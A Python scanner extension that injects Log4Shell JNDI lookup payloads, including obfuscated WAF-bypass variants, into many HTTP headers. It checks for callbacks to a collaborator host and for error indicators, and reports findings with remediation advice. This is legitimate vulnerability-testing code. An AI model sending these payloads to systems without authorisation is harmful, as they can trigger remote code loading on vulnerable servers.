"""Log4Shell Scanner — inject JNDI payloads across multiple headers for OOB detection."""

from __future__ import annotations

import logging
import uuid
from typing import Any
from urllib.parse import urlparse

import httpx

from models import ScanFinding

log = logging.getLogger("proxy-engine.ext.log4shell")

NAME = "log4shell-scanner"
DESCRIPTION = "Inject ${jndi:ldap://} payloads in headers for Log4Shell (CVE-2021-44228) OOB detection"
CHECK_TYPE = "active"
ENABLED = False

_config: dict[str, Any] = {
    "collaborator": "collab.example.com",
}

# Headers commonly parsed by Log4j
INJECTION_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "Referer",
    "X-Api-Version",
    "Accept",
    "Content-Type",
    "X-Forwarded-Host",
    "X-Real-IP",
    "True-Client-IP",
    "X-Client-IP",
    "X-Originating-IP",
    "Authorization",
    "Cookie",
]

# Payload variants to bypass WAF
PAYLOAD_TEMPLATES = [
    "${jndi:ldap://{collab}/{tag}}",
    "${jndi:dns://{collab}/{tag}}",
    "${jndi:rmi://{collab}/{tag}}",
    "${{jndi:ldap://{collab}/{tag}}}",
    "${${{lower:jndi}}:ldap://{collab}/{tag}}",
    "${${{lower:j}}ndi:ldap://{collab}/{tag}}",
    "${j${{::-n}}di:ldap://{collab}/{tag}}",
    "${jn${{env:BARFOO:-d}}i:ldap://{collab}/{tag}}",
    "${${{env:BARFOO:-j}}ndi:ldap://{collab}/{tag}}",
    "${jndi:ldap://{collab}/{tag}/a}",
]


def configure(config: dict) -> dict:
    _config.update(config)
    return {"status": "configured", "config": _config}


def get_state() -> dict:
    return {"config": _config}


async def active_check(url: str) -> list[ScanFinding]:
    """Inject JNDI payloads across all target headers."""
    findings: list[ScanFinding] = []
    collab = _config.get("collaborator", "collab.example.com")
    parsed = urlparse(url)

    async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
        for header_name in INJECTION_HEADERS:
            for template in PAYLOAD_TEMPLATES:
                tag = f"log4j-{header_name.lower()}-{uuid.uuid4().hex[:8]}"
                payload = template.format(collab=collab, tag=tag)

                headers = {header_name: payload}
                # Keep Host header valid
                if header_name == "Content-Type":
                    headers["Content-Type"] = payload

                try:
                    resp = await client.get(url, headers=headers, follow_redirects=False)

                    # Check for obvious indicators (connection back, error leak)
                    body = resp.text[:5000].lower()
                    indicators = [
                        "javax.naming",
                        "jndiexploit",
                        "log4j",
                        "jndi",
                        "InitialContext",
                        "com.sun.jndi",
                    ]
                    detected = any(ind.lower() in body for ind in indicators)

                    if detected:
                        findings.append(ScanFinding(
                            template_id="log4shell_jndi",
                            name=f"Log4Shell (CVE-2021-44228) via {header_name}",
                            severity="critical",
                            url=url,
                            matched_at=url,
                            description=(
                                f"JNDI lookup indicator detected when injecting Log4Shell payload "
                                f"in '{header_name}' header. Payload: {payload[:80]}. "
                                f"Verify OOB callback at {collab} with tag '{tag}'."
                            ),
                            extracted=[
                                f"Header: {header_name}",
                                f"Payload: {payload}",
                                f"OOB tag: {tag}",
                                f"Collaborator: {collab}",
                            ],
                            source="extension",
                            confidence="firm",
                            remediation=(
                                "Upgrade Log4j to 2.17.1+. Set log4j2.formatMsgNoLookups=true. "
                                "Remove JndiLookup class from classpath."
                            ),
                        ))
                        break  # One finding per header is enough

                except Exception as e:
                    log.debug(f"Log4Shell check error ({header_name}): {e}")
                    continue

            # If a finding was generated for this header, move to next header
            if findings and findings[-1].extracted and header_name in findings[-1].extracted[0]:
                continue

    # Always generate an informational finding with OOB tags for manual verification
    if not findings:
        tag = f"log4j-bulk-{uuid.uuid4().hex[:8]}"
        findings.append(ScanFinding(
            template_id="log4shell_oob_check",
            name="Log4Shell: OOB Verification Required",
            severity="info",
            url=url,
            matched_at=url,
            description=(
                f"Log4Shell payloads injected across {len(INJECTION_HEADERS)} headers with "
                f"{len(PAYLOAD_TEMPLATES)} payload variants each. "
                f"Check collaborator ({collab}) for OOB DNS/LDAP callbacks. "
                f"No in-band indicators detected."
            ),
            extracted=[f"Collaborator: {collab}", f"Headers tested: {len(INJECTION_HEADERS)}"],
            source="extension",
            confidence="tentative",
            remediation="Monitor OOB collaborator for callbacks. If received, upgrade Log4j immediately.",
        ))

    return findings
